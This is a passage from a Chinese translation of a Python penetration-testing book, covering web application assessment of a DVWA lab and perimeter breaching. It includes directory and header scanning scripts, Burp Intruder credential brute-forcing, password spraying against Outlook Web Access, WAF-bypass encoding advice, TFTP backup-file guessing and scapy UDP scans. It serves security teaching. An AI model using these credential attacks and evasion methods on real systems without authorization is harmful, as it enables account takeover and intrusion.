在本章中，我们重点介绍了一种在样本环境中移动的方法。具体来说，如何利用相关框，提升权限并提取额外的凭据。从这个位置，我们确定了其他可行的主机，我们可以横向移动到这些主机，并且目前登录到这些主机的用户。我们使用 Veil Framework 生成自定义有效载荷来绕过 HIPS，并执行了 PtH 攻击。这使我们能够使用 Mimikatz 工具从内存中提取其他凭据。然后，我们使用 Python 和 MSFRPC 自动识别了可行的次要目标和登录到这些目标的用户。这些内容可能会让人感到非常惊讶，无论是复杂性还是缺乏复杂性，这取决于你的期望。请记住，这将完全取决于你的环境以及实际破解所需的工作量。本章提供了许多与利用网络和基于系统的资源相关的细节，下一章将突出不同的角度，即 Web 评估。


# 第六章：用 Python 评估 Web 应用程序

Web 应用程序评估或 Web 应用程序渗透测试，与基础设施评估相比是一种不同的动物。这也取决于评估的目标。Web 应用程序评估，如移动应用程序评估，往往以错误的方式进行。网络或基础设施渗透测试已经成熟，客户对结果的期望也变得更加明智。但对于 Web 应用程序或移动应用程序评估并非总是如此。有各种工具可用于分析应用程序的漏洞，包括 Metasploit、Nexpose、Nessus、Core Impact、WebInspect、AppScan、Acunetix 等。其中一些工具对于 Web 应用程序漏洞评估要好得多，但它们都有一些共同点。其中之一是它们不能替代渗透测试。

这些工具有它们的用处，但取决于参与范围和试图识别的弱点，它们经常不够。特定产品如 WebInspect、AppScan 和 Acunetix 适用于识别潜在的漏洞，特别是在**系统开发生命周期**（**SDLC**）期间，但它们会报告误报并错过复杂的多阶段利用。每个工具都有其用处，但即使使用这些工具，也可能会忽略相关风险。

现在这个硬币的另一面是，渗透测试不会发现 Web 应用程序中的每个漏洞，但它本来就不是为此而设计的。Web 应用程序渗透测试的重点是识别系统性的开发问题、流程和关键风险。因此，识别出的漏洞可以迅速得到纠正，但具体的弱点指向应该在整个 SDLC 中解决的更大的安全实践。

大多数应用程序渗透测试的重点应该涉及以下至少一些组件，如果不是全部：

+   对当前**开放式 Web 应用安全项目**（**OWASP**）十大漏洞的分析。

+   识别泄露数据或在某些位置留下残留数据痕迹的应用程序领域，其中包括未记录或未链接的页面或目录。这也被称为数据永久性。

+   恶意行为者可以从一个帐户类型横向移动到另一个帐户类型或提升权限的方式。

+   应用程序可能提供攻击者注入或操纵数据的方式的领域。

+   应用程序可能创建**拒绝服务**（**DoS**）情况的方式，但通常是在不利用或明确验证的情况下完成，以防止对业务运营造成任何影响。

+   最后，攻击者如何渗透内部网络。

考虑所有这些组件，你会发现应用程序扫描工具无法识别所有这些组件。此外，渗透测试应该有具体的目标和目标，以识别具有相关概念证明的指示器和问题。否则，如果评估人员试图根据复杂性识别应用程序中的所有漏洞，可能需要很长一段时间。

这些建议和应用程序代码应该由客户进行审查。客户应该纠正评估人员指出的所有指定位置，然后继续并识别评估人员在此期间可能未能识别的其他弱点。完成后，SDLC 应该更新，以便将来的弱点在开发中得到纠正。最后，应用程序越复杂，涉及的开发人员就越多；因此，在测试时，要注意漏洞热图。

就像渗透测试人员一样，开发人员的技能水平可能各不相同，如果组织的 SDLC 不够成熟，应用程序领域的漏洞等级可能会因每个开发团队的不同而有所不同。我们称之为漏洞热图，即应用程序中的某些地方可能比其他地方有更多的漏洞。这通常意味着开发人员或团队没有必要的技能以与其他团队相同的水平交付产品。存在更多漏洞的区域也可能表明存在更多关键漏洞。因此，如果注意到应用程序的特定区域像圣诞树一样闪烁着弱点，就要提高你所关注的攻击向量的类型。

根据参与的范围，开始专注于可能破解安全围栏的漏洞，例如**结构化查询语言注入**（**SQLi**）、**远程**或**本地文件包含**（**RFI**/**LFI**）、未经验证的重定向和转发、不受限制的文件上传，最后是不安全的直接对象引用。这些漏洞都与应用程序的请求-响应模型的操纵有关。

应用程序通常采用请求-响应模型工作，使用 cookie 跟踪特定用户会话数据。因此，当编写脚本时，必须以一种处理发送数据、接收数据并解析结果的方法构建它们，以确定是否符合预期。然后，可以创建后续请求以进一步推进。

# 识别活动应用程序与开放端口

在评估包括**内容交付网络**（**CDN**）在内的大型环境时，您会发现会识别出数百个开放的 Web 端口。这些 Web 端口中大多数没有部署活动的 Web 应用程序，因此您需要访问每个页面或请求 Web 页面头。这可以通过对站点的`http://`和`https://`版本执行`HEAD`请求来简单地完成。使用`urllib2`的 Python 脚本可以轻松执行此操作。该脚本只需一个主机**互联网协议**（**IP**）地址文件，然后构建创建相关**统一资源定位器**（**URL**）的字符串。当请求每个站点时，如果收到成功的请求，数据将被写入文件：

```py
#!/usr/bin/env python
import urllib2, argparse, sys
defhost_test(filename):
    file = "headrequests.log"
    bufsize = 0
    e = open(file, 'a', bufsize)
    print("[*] Reading file %s") % (file)
    with open(filename) as f:
        hostlist = f.readlines()
    for host in hostlist:
        print("[*] Testing %s") % (str(host))
        target = "http://" + host
        target_secure = "https://" + host
        try:
            request = urllib2.Request(target)
            request.get_method = lambda : 'HEAD'
            response = urllib2.urlopen(request)
        except:
            print("[-] No web server at %s") % (str(target))
            response = None
        if response != None:
            print("[*] Response from %s") % (str(target))
            print(response.info())
            details = response.info()
            e.write(str(details))
        try:
            response_secure = urllib2.urlopen(request_secure)
            request_secure.get_method = lambda : 'HEAD'
            response_secure = urllib2.urlopen(request_secure)
        except:
            print("[-] No web server at %s") % (str(target_secure))
            response_secure = None
        if response_secure != None:
            print("[*] Response from %s") % (str(target_secure))
            print(response_secure.info())
            details = response_secure.info()
            e.write(str(details))
    e.close()
```

以下屏幕截图显示了脚本在屏幕上运行时的输出：

![识别活动应用程序与开放端口](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_01.jpg)

### 注意

完整版本的脚本可以在[`raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/headrequest.py`](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/headrequest.py)找到。如果需要，可以轻松修改此脚本以执行后续任务。已经有工具如`PeppingTom`和`EyeWitness`可用，比这个脚本更好地完成这项活动，但是了解如何构建这个基本脚本将使您能够根据需要包含额外的分析。

# 使用 Python 识别隐藏文件和目录

当我们访问已识别的 IP 地址的网站时，我们发现它是**可恶的易受攻击的 Web 应用程序**（**DVWA**）。我们还看到它已将默认登陆页面的详细信息附加到我们的初始请求中。这意味着我们从`http://192.168.195.145/dvwa/login.php`网站开始，如下面的屏幕截图所示：

![使用 Python 识别隐藏文件和目录](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_02.jpg)

现在我们有了一个起点进行测试，并且使用这些详细信息，我们可以寻找隐藏的目录和文件。让我们修改我们的最后一个脚本，自动查找隐藏的文件或目录。

这样做的最佳方式是从我们所在的站点的基本目录开始。您可以向上级跳转，但在多个网站托管的环境中，您可能会跳出范围。因此，在进行攻击之前，请了解您的环境。如您在下面的截图中所见，该脚本运行文件夹和文件名的文件，并将它们附加到目标站点。然后我们会报告它们是否有效：

```py
#!/usr/bin/env python
import urllib2, argparse, sys
defhost_test(filename, host):
    file = "headrequests.log"
    bufsize = 0
    e = open(file, 'a', bufsize)
    print("[*] Reading file %s") % (file)
    with open(filename) as f:
        locations = f.readlines()
    for item in locations:
        target = host + "/" + item
        try:
            request = urllib2.Request(target)
            request.get_method = lambda : 'GET'
            response = urllib2.urlopen(request)
        except:
            print("[-] %s is invalid") % (str(target.rstrip('\n')))
            response = None
        if response != None:
            print("[+] %s is valid") % (str(target.rstrip('\n')))
            details = response.info()
            e.write(str(details))
    e.close()
```

知道这一点，我们可以加载四个最常见的隐藏或未链接位置，这些位置是网站的`admin`，`dashboard`，`robots.txt`和`config`。使用这些数据，当我们运行脚本时，我们可以识别出两个可行的位置，如下面的截图所示。`Robots.txt`很好，但`config`通常意味着如果权限不正确或文件未被 Web 服务器使用，我们可以找到用户名和密码。

![使用 Python 识别隐藏文件和目录](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_03.jpg)

如您在此处所见，我们得到了目录内容的列表：

![使用 Python 识别隐藏文件和目录](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_04.jpg)

不幸的是，当您打开`config.inc.php`文件时，如此截图所示，没有显示任何内容：

![使用 Python 识别隐藏文件和目录](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_05.jpg)

管理员和支持人员并不总是理解他们的一些行为所产生的影响。当从`config`文件创建备份时，如果它们没有被积极使用，或者权限设置不正确，你通常可以通过浏览器读取它们。Linux 系统上的备份文件以`~`结尾。我们知道这是一个 Linux 系统，因为之前的`HEAD`请求显示它是一个 Ubuntu 主机。

### 提示

请记住，管理员和安全工具可以操纵标头，因此不应将其视为信息的权威来源。

如您在下面的截图中所见，该请求打开了一个`config`文件，为我们提供了访问数据库服务器所需的详细信息，从中我们可以提取关键数据：

![使用 Python 识别隐藏文件和目录](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_06.jpg)

作为渗透测试人员，您必须高效利用时间，正如之前提到的，这是成功渗透测试的障碍之一。这意味着当我们研究数据库的内容时，我们也可以设置一些自动化工具。一个简单的测试是使用 Burp Suite 的 Intruder 功能。

### 注意

完整版本的`dirtester.py`脚本可以在[`raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/dirtester.py`](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/dirtester.py)找到。

# 使用 Burp Suite 进行凭证攻击

从[`portswigger.net/burp/download.html`](http://portswigger.net/burp/download.html)下载 Burp Suite 免费版，然后运行它。确保您使用的浏览器不会干扰您的应用程序测试评估。大多数现代浏览器会自动减轻您的测试工作，而且大多数这些保护措施无法关闭，以完成无阻碍的测试。Firefox 具有这些保护功能，但可以关闭以进行开发和安全分析。此外，Firefox 的插件支持使您能够更好地评估应用程序。许多刚开始的评估人员无法理解为什么他们刚刚执行的一些新的**跨站脚本攻击**（**XSS**）被阻止。通常是 Chrome 或 Internet Explorer 中的一些内置浏览器保护说它是关闭的，但实际上并非如此。

现在，从 Firefox 中，通过在手动代理配置中输入`127.0.0.1`和`端口 8080`来打开本地代理支持，如下所示：

![使用 Burp Suite 进行凭证攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_07.jpg)

在评估 Web 应用程序时，您希望将范围限制在您想要测试的系统上。确保您设置了这一点，然后过滤所有其他目标以清理输出，并防止自己错误地攻击其他主机。这可以通过右键单击**站点地图**窗口中的主机，或单击**范围**选项卡并手动添加来完成，如此截图所示：

![使用 Burp Suite 进行凭证攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_08.jpg)

现在 Burp 已经设置好，我们可以开始评估 DVWA 网站，该网站有一个简单的登录页面，需要用户名和密码。加载每个网页时，您必须禁用**拦截**模式，或单击**转发**以转到下一个页面。我们将在几分钟内需要拦截功能，因此我们将保持启用。基本上，Burp Suite——如前所述——是一个透明代理，可以在网站和浏览器之间发送所有指定的流量。这使您可以实时操纵数据和流量，这意味着您可以使应用程序执行与预期不同的操作。

要开始此分析，我们必须查看登录页面如何格式化其请求，因为它被发送到服务器，以便进行操纵。因此，我们在登录提示中提供错误的用户名和密码——对于用户名和密码都使用字母`a`——并在代理中捕获请求。以下图片显示了 Burp Intruder 捕获的错误登录的原始捕获。

![使用 Burp Suite 进行凭证攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_09.jpg)

然后，右键单击它，选择发送到入侵者，并在代理中关闭拦截。这样我们就可以重复操纵发送到服务器的请求，看看是否可以获得不同的响应。

按照这种模式，我们可以配置攻击以运行用户名和密码列表，这可能会授予我们访问权限。单击**入侵者**主选项卡和**位置**次要选项卡。选择最初提供的用户名和密码的两个位置，然后从下拉菜单中选择**簇弹**，如下截图所示：

### 注意

入侵者攻击有多种类型，簇弹将是您评估中最常用的类型。有关入侵者攻击的更多详细信息，请访问[`support.portswigger.net/customer/portal/articles/1783129-configuring-a-burp-intruder-attack`](https://support.portswigger.net/customer/portal/articles/1783129-configuring-a-burp-intruder-attack)。

![使用 Burp Suite 进行凭证攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_10.jpg)

然后创建两个列表；载荷集 1 用于用户名，载荷集 2 用于密码。

![使用 Burp Suite 进行凭证攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_11.jpg)

接下来，选择**始终**以跟随重定向，因为登录通常会创建网站转换。

### 提示

为整个评估设置一个严格的范围，然后使用入侵者忽略范围的好处是，您知道在整个过程中不会擅自进入意外的领域。

![使用 Burp Suite 进行凭证攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_13.jpg)

然后单击**入侵者**菜单项，并选择**开始**，将显示一个新的弹出窗口。您可以通过与其他结果相比的大小变化来识别可行的帐户。

![使用 Burp Suite 进行凭证攻击](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_14.jpg)

现在您可以直接访问 Web 应用程序，这使您可以浏览应用程序。

# 使用 twill 浏览源代码

Python 有一个库，允许您在源级别浏览和与 Web 应用程序交互。安装库后，您可以导入库，或使用`twill` shell，称为`twill-sh`。

![使用 twill 浏览源代码](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_15.jpg)

然后加载目标网站，并使用以下命令查看页面的源代码：

```py
go http://192.168.195.159/dvwa/index.php
show

```

这只是显示了网站的源代码，这使您可以进一步与网站交互。

![使用 twill 浏览源代码](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_16.jpg)

这允许你直接与网站的组件进行交互，并确定需要提交的内容。`twill-sh`库在交互模式下运行时提供了帮助支持，但它是一个有限的工具。twill 擅长的是与源代码进行交互，并识别网站可能感兴趣的区域。它不适用于具有重要动态内容或广泛页面的网站。例如，我运行了`info`命令，试图识别网站的特定内容，就像这样：

![使用 twill 浏览源代码](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_17.jpg)

在这个基本水平上，你可以了解应用程序中可以操纵的内容类型、数据格式和其他细节，但在 Python 中有更好的库可以实现与下面描述的相同的结果：

# 了解何时使用 Python 进行 Web 评估

Python 有几个非常有用的库，用于执行 Web 应用程序评估，但也有一些限制。Python 最适用于无法通过透明代理手动模拟的 Web 应用程序的小型自动化组件，例如 Burp。这意味着你在应用程序中找到的特定工作流可能是临时生成的，无法通过透明代理轻松复制。特别是在涉及时间的问题时。因此，如果你需要使用多个请求和响应机制与后端服务器进行交互，那么 Python 可能是合适的选择。

## 了解何时使用特定的库

在处理 Web 应用程序时，主要会使用五个库。在历史上，我最常使用的是`urllib2`库，这是因为它具有很多出色的功能和易于原型代码的方法，但这个库已经过时了。你会发现它缺少一些重要的功能，并且与新时代的 Web 应用程序交互的更高级方法被认为是不可用的，这与下面描述的新库相比。`httplib2` Python 库在与网站交互时提供了强大的功能，但与`urllib2`、`mechanize`、`request`和`twill`相比，它要难得多。也就是说，如果你需要处理与代理相关的复杂检测功能，这可能是你最好的选择，因为发送的头部数据可以完全操纵，以完美模拟标准浏览器流量。在使用于真实应用程序之前，应该在模拟环境中进行充分测试。通常，这个库会因为客户端请求的方式而提供错误的响应。

如果你来自 Perl 世界，你可能会立即倾向于将`mechanize`作为你的首选库，但它在处理动态网站时效果不佳，在某些情况下甚至根本无法使用。那么今天的答案是什么？`request`库。它非常干净，并提供了满足当今复杂 Web 交互挑战的必要功能。为了突出这两者之间的差异和原型代码，我使用`httplib2`和`request`创建了应用凭证攻击脚本。这些脚本的目的是识别活动凭证集并捕获相关的 cookie。完成后，可以向任一脚本添加其他功能。此外，这两个脚本突出了库集之间的差异。

第一个例子是`httplib2`版本，如下所示：

![了解何时使用特定的库](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_18.jpg)

第二个是`request`库的版本，可以在下面的截图中看到：

![了解何时使用特定的库](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_06_19.jpg)

### 注意

基于请求的脚本可以在[`raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/request_brute.py`](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/request_brute.py)找到，`httplib2`脚本可以在[`raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/httplib2_brute.py`](https://raw.githubusercontent.com/funkandwagnalls/pythonpentest/master/httplib2_brute.py)找到。

正如您所看到的，它们的长度几乎相同，但请求中的陈述制作了 Web 流量模拟变得更简单。

## 在 Web 评估期间保持高效

使用这样的脚本或 Burp 之类的脚本的好处在于分析可以被操纵、注入或暴力破解的参数。具体来说，您可以与通过 Web 浏览器无法直接看到的代码功能进行交互，速度超出了人类的交互速度。其中的例子包括构建常见 SQLi 或 XSS 攻击的利用列表。构建常见的 SQLi 攻击或 XSS 攻击列表。然后将它们加载到网站上的相关参数中，以识别漏洞。您将不得不修改上述脚本以命中目标参数，但这将大大加快识别潜在漏洞的过程。

### 注意

每个数据库实例的常见注入类型的最佳 SQLi 列表可以在[`pentestmonkey.net/category/cheat-sheet/sql-injection`](http://pentestmonkey.net/category/cheat-sheet/sql-injection)找到。同样好的 XSS 列表可以在[`www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet`](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)找到。其中一些细节也内置在 Burp Suite 中，如[`support.portswigger.net/customer/portal/articles/1783128-Intruder_Common%20Uses.html`](https://support.portswigger.net/customer/portal/articles/1783128-Intruder_Common%20Uses.html)中所强调的。

今天，我们必须应对**Web 应用程序防火墙**（**WAFs**）和可以被绕过的保护工具，但您需要了解这些保护是如何设置的，以及什么样的字符编码可以绕过它们。请记住，如果存在白名单或黑名单，它们是基于特定字符集和/或编码的，这可能会阻止您的利用尝试。通过自动化测试，我们可以识别那些基于捕获的项目，防止利用 Web 应用程序，并且我们可以根据此定制我们的注入以绕过已经设置的保护。

### 提示

Web 应用程序评估的字符编码与生成有效载荷完全不同。因此，您应该了解这些陈述并不矛盾。大多数 WAF 并不会在将数据与其白名单和/或黑名单进行比较之前智能地检测和解码数据。因此，您可以通过将字符格式更改为应用程序可以理解但 WAF 无法理解的内容来绕过这些保护机制。

这对于诸如`sqlmap`之类的工具非常重要，它非常适用于验证 SQLi，但它的请求应该定制。只有在确认存在可疑的注入漏洞后才应使用它。然后应该用它来构建概念验证，提取数据或者妥协系统。加载`sqlmap`来命中每个参数以寻找 SQLi 是一个非常耗时的过程。它可能会提供潜在的误报并破坏系统。

### 提示

请记住，如果您不自定义参数和传递给`sqlmap`的请求，它可能会将非盲注入攻击转变为盲注入攻击，这将显著影响完成任务所需的时间。该工具可能是市场上最好的工具，但没有聪明的用户，它有时会迷失方向。

# 总结

在本章中，我们讨论了 Web 应用程序评估和普通网络评估之间的区别。强调了识别活动网页与开放端口的方法，并演示了如何使用 Burp 识别未链接或隐藏的内容并执行凭据攻击。此外，本章还演示了如何使用 twill 浏览网站，提取数据，然后创建脚本，以便使用不同的库构建请求-响应链。本章的总结强调了如何通过使用脚本和开源工具来检查特定漏洞的站点以提高效率。

在下一章中，我们将看到如何利用这些技术和其他弱点来攻破组织的边界。


# 第七章：用 Python 破解边界

大多数评估人员必须应对的最困难的问题是找到一种方法，从互联网上打破内部网络，而不会钓鱼组织的民众。有时会有广泛暴露的网络，但大多数组织已经学会了加强外部边界。不幸的是，仍然存在一个硬外部和一个较软的内部，监控控制较轻，无法阻止真正的恶意行为者侵害资源。这意味着我们应该模拟恶意行为者执行的活动来破解边界。这反过来又意味着了解今天典型的边界是什么样子。

# 理解今天的边界

一些网络仍然暴露了不应该暴露的服务，但大多数情况下，这些暴露的服务很少会带来可利用的风险。这些具体例子的突出将引发您作为评估人员的心态转变，您可以破解组织的边界。这些并不是互联网上可能发现的所有例子，但它们将突出共同点。

## 明文协议

文件传输协议（FTP）和 Telnet 是明文协议的例子，可能会暴露在边界上，并且通常不会带来大多数自动化工具所排名的风险。除非服务器包含关键数据或可以导致关键数据访问，具有已知的远程代码执行（RCE）漏洞，或者解决方案中有默认或已知的凭据。它们仍然不应该暴露在互联网上，但它们通常不像大多数漏洞管理系统（VMS）所排名的那样危险。原因是攻击者要利用它，他或她有四种主要方法来破坏一个帐户。

最常见的方法是嗅探凭据，这意味着他或她必须在通信的客户端或服务器端本地存在，或者在通过路由路径的通道中。第二种方法是通过破坏存储这些凭据的系统。第三种是通过执行某种类型的社会工程攻击，这意味着如果用户容易受到攻击，这些凭据可能会获得对许多其他服务的访问权限，而不仅仅是明文协议。第四种是对服务执行在线凭据攻击，例如密码喷射、字典攻击或暴力破解。这并不是说明文协议没有风险，而是指出它比 VMS 解决方案所宣传的更难利用。

## Web 应用程序

通过多年的评估、妥协和安全工程师提出的建议，今天暴露的服务的主要例子是 Web 应用程序。这些应用程序可以在各种端口上，包括非标准端口。它们通常是负载平衡的，可能通过复杂的内容交付网络（CDN）提供，这有效地提供了从更接近请求用户基地的服务器提供的材料的缓存版本。此外，这些应用程序可以从虚拟化平台提供，这些平台与其他系统隔离在提供商的环境中。因此，即使您破解了 Web 应用程序，您可能也无法访问目标网络。如果您想知道为什么在破解 Web 应用程序系统后无法取得任何进展，请记住这一点。还要确保您有权限测试客户端未受控制的网络。

## 加密远程访问服务

例如，**远程桌面协议**（**RDP**）和**安全外壳**（**SSH**）等服务通常提供对内部网络的直接访问。这些服务可以通过多因素身份验证进行保护，并且它们是加密的，这意味着执行**中间人**（**MitM**）攻击要困难得多。因此，针对这些服务的攻击将取决于未设置的控制措施，而不是它们的存在。

## 虚拟专用网络（VPN）

除了 Web 服务之外，暴露在互联网上的另一个最常见的服务是 VPN，其中包括但不限于**点对点隧道协议（PPTP）**，**互联网安全协会和密钥管理协议（ISAKMP）**等。对这些服务的攻击通常是多阶段的，并且需要获取其他信息，例如组名或组密码。这将是除了标准用户名和密码之外，作为特定用户进行身份验证的额外步骤。

许多时候，根据实施情况，您甚至可能需要特定的软件与设备关联，例如 Citrix 或 Cisco AnyConnect。一些供应商甚至对其 VPN 软件的许可副本收取费用，因此即使您找到了所有必要的详细信息，您可能仍然需要找到一个有效的软件副本或正确的版本。此外，盗版这些软件组件，而不是购买它们，甚至可能通过使用有自己责任的毒害版本来打开您或您客户的网络，使其面临妥协的风险。

## 邮件服务

我们已经广泛讨论了邮件服务可能被利用的方式。您仍然会看到这些服务暴露在外，这意味着可能仍然有机会找到所需的详细信息。

## 域名服务（DNS）

与识别与**完全合格域名**（**FQDN**）相关的**Internet Protocol**（**IP**）地址有关的服务。许多时候，这些可能在提供的 IP 范围内，但实际上超出了范围，因为它们是由**互联网服务提供商**（**ISP**）拥有的。此外，昨天的漏洞，如区域传输，在今天的网络中通常不容易被利用。

## 用户数据报协议（UDP）服务

除了已经提到的作为 UDP 服务运行的服务之外，您可能会发现**简单网络管理协议**（**SNMP**）和**简单文件传输协议**（**TFTP**）。这两种服务都可以提供系统的详细信息和访问权限，具体取决于它们所透露的信息。如果找到正确的社区字符串，SNMP 可以提供系统详细信息，有时甚至可以提供系统本身的密码，尽管这在面向互联网的系统上非常罕见。另一方面，TFTP 被用作网络设备配置的主要手段，防火墙管理员经常错误地将该服务从**非军事区**（**DMZ**）或半受信任的网络暴露到互联网上。

### 注意

您可以设置自己的 Ubuntu TFTP 服务器来执行这种攻击，方法是从[`www.ubuntu.com/download/alternative-downloads`](http://www.ubuntu.com/download/alternative-downloads)下载 Ubuntu，并使用[`askubuntu.com/questions/201505/how-do-i-install-and-run-a-tftp-server`](http://askubuntu.com/questions/201505/how-do-i-install-and-run-a-tftp-server)中的详细信息设置服务器。

# 了解帐户和服务之间的联系

在面对互联网的资源时，你正在尝试确定哪些服务可能存在漏洞，使你能够访问关键服务。因此，例如，SSH 或 Telnet 可能与 Windows 帐户身份验证无关，除非组织非常成熟，并且正在使用诸如 Centrify 之类的产品。因此，针对这些类型的服务的字典攻击可能无法访问允许你使用提取的详细信息进行横向移动的资源。此外，由于易于整合此类设备，大多数管理团队对 Linux 和基于 Unix 的资源在安全环境中具有相当好的监控。

# 使用 Burp Suite 破解收件箱

我们在第六章中强调了如何使用 Burp Suite 进行密码喷洒，*使用 Python 评估 Web 应用程序*。使用 Burp Suite 最好的目标之一是面向互联网的**Outlook Web Access**（**OWA**）界面。这是你可以进行的最简单的攻击之一，但也是最响亮的攻击之一。你应该始终减少命中收件箱的时间，并使用符合 Active Directory 复杂性要求的非常常见的密码，如前几章中所述。

一旦你确定了与之前请求相比具有不同字节大小的响应，可能会突出显示你已经找到了一个具有有效凭据集的活动收件箱。使用这些详细信息访问收件箱，并寻找关键数据。关键数据包括任何可能被认为对公司敏感的东西，这将突出对领导层的风险或展示需要立即或计划的活动，以纠正该风险。它还包括任何可能允许你访问组织本身的东西。

示例包括通过电子邮件发送的密码和用户名，KeePass 或 LastPass 文件，网络的远程访问指令，VPN 软件，有时甚至是软件令牌。想想你的组织在电子邮件中发送的东西；如果没有多因素身份验证，这是攻击向量的一个很好的选择。为此，越来越多的组织已经转向了多因素身份验证，因此，这种攻击向量正在消失。

# 识别攻击路径

正如许多书籍中所述，包括本书在内，人们经常忘记 UDP。这在一定程度上是因为针对 UDP 服务的扫描的响应经常是虚假的。来自诸如`nmap`和`scapy`之类的工具的返回数据可以为实际上是打开的端口提供响应，但报告为`Open|Filtered`。

## 了解周界扫描的限制

举例来说，对主机的研究表明，基于另一个服务的描述性横幅，TFTP 服务器可能在其上处于活动状态，但使用`nmap`进行的扫描指向该端口为`open|filtered`。

以下图显示了 UDP 服务 TFTP 的响应为 open|filtered，如前所述，尽管它已知为打开：

![了解周界扫描的限制](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_07_01.jpg)

这意味着该端口实际上可能是打开的，但当大量响应显示许多端口以这种方式表示时，你可能对结果的信任度较低。抓取每个端口和协议的横幅可能是不可能的，因为可能没有实际的横幅可供抓取。诸如`scapy`之类的工具可以通过提供更详细的响应来解决这个问题，以便你自己解释。例如，使用以下命令可能会引发 TFTP 服务的响应：

```py
#!/usr/bin/env python

fromscapy.all import *

ans,uns = sr(IP(dst="192.168.195.165")/UDP(dport=69),retry=3,timeout=1,verbose=1)

```

以下图显示了从 Scapy 执行 UDP 端口扫描，以确定 TFTP 服务是否真正暴露或不暴露：

![了解周界扫描的限制](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_07_02.jpg)

我们看到有一个未回答的响应，可以使用`summary()`函数获取详细信息，如下所示：

![了解周界扫描的限制](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_07_03.jpg)

当扫描一个端口和一个 IP 地址时，这并不是很有用，但如果测试的是多个 IP 地址或端口，像下面的扫描一样，`summary()`和`display()`函数将会非常有用：

```py
ans,uns = sr(IP(dst="192.168.195.165")/UDP(dport=[(1,65535)]),retry=3,timeout=1,verbose=1)

```

不管结果如何，TFTP 对这些扫描没有响应，但这并不一定意味着服务已关闭。根据配置和控制，大多数 TFTP 服务不会对扫描做出响应。这样的服务可能会产生误导，特别是如果启用了防火墙。如果你尝试连接到服务，你可能会收到与没有防火墙过滤实际客户端响应相同的响应，如下面的截图所示：

![了解周界扫描的限制](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_07_04.jpg)

这个例子旨在强调当涉及到暴露的服务、防火墙和其他保护机制时，你不能信任你的 UDP 扫描器。你需要考虑其他细节，比如主机名、其他服务横幅和信息来源。我们专注于 TFTP 作为一个例子，因为如果它暴露了，它对我们作为攻击者提供了一个很好的功能；它不需要凭据来提取数据。这意味着我们只需要知道正确的文件名来下载它。

## 从 TFTP 服务器下载备份文件

因此，要确定这个系统是否实际包含我们想要的数据，我们需要查询实际文件名的服务。如果我们猜对了文件名，我们可以在我们的系统上下载文件，但如果没有，服务将不会提供任何响应。这意味着我们必须根据其他服务横幅来识别可能的文件名。如前所述，TFTP 最常用于存储网络设备的备份，如果使用了自动存档功能，我们可能能够对实际文件名做出合理的猜测。

通常，管理员使用主机名作为备份文件的基本名称，然后随着时间的推移递增备份文件。因此，如果主机名是`example_router`，那么使用这个功能的第一个备份将是`example_router-1`。因此，如果你知道主机名，你可以递增跟随主机名的数字，这代表了潜在的备份文件名。这些请求可以通过 Hydra 和 Metasploit 等工具完成，但你需要根据识别出的主机名生成一个自定义的单词列表。

相反，我们可以编写一个及时的 Python 脚本来满足这个特定的需求，这将更合适。及时脚本是顶级评估者经常使用的概念。它们生成一个脚本来执行当前工具无法轻松执行的任务。这意味着我们可以找到一种自动操纵环境的方式，这是 VMS 不会检测到的。

### 确定备份文件名

要确定潜在的备份文件名范围，你需要识别可能是常规备份例程的主机名。这意味着连接到 Telnet、FTP 和 SSH 等服务，提取横幅。获取大量服务的横幅可能会耗费时间，即使使用 Bash、`for`循环和`netcat`。为了克服这一挑战，我们可以编写一个短小的脚本，来代替我们连接所有这些服务，如下面的代码所示，甚至在未来需要时进行扩展。

这个脚本使用一个端口列表，并将它们提供给每个被测试的 IP 地址。我们使用一系列潜在的 IP 地址作为基本 IP 地址的第四个八位字节。你可以生成额外的代码来从文件中读取 IP，或者从**无类域间路由**（**CIDR**）地址创建一个动态列表，但这将需要额外的时间。如下所示，当前的脚本满足了我们的即时需求：

```py
#!/usr/bin/env python
import socket

def main():
    ports = [21,23,22]
    ips = "192.168.195."
    for octet in range(0,255):
        for port in ports:
